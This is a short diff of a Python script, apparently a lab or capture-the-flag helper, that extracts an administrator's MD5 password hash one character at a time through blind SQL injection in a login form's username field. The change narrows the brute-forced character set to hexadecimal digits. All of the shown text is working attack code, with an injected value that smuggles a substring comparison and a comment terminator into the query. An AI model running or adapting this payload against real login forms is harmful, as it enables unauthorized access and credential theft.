@@ -8,7 +8,7 @@ extractedHash = ''
 i = 1
 while i <= 32 :
     # Loop over the MD5 character set
-    MD5Characters = "abcdefghijklmnopqrstuvwxyz0123456789" 
+    MD5Characters = "abcdef0123456789" 
     for char in MD5Characters:
         # injection into username parameter, each time we brute force the current hash character
         parameters = {'username': "admin' and substring(password, "+str(i)+", 1) = '"+ char + "' -- -",'password':''}
